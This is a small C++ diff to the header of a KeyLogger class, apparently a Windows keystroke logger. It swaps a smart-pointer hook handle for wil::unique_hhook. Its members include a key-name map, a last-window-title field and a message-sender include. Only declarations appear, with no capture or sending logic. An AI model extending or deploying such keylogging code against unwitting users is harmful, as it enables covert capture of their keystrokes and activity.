@@ -4,6 +4,7 @@
 #include <map>
 #include <mutex>
 #include <Windows.h>
+#include <wil/resource.h>
 
 #include "IMessageSender.h"
 
@@ -25,7 +26,7 @@ private:
 
 	static std::mutex _mutex;
 	static std::vector<KeyLogger*> _instances;
-	static std::unique_ptr<HHOOK> _hook;
+	static wil::unique_hhook _hook;
 	static std::map<int, std::string> _keyNames;
 	static std::string _lastWindowTitle;
 
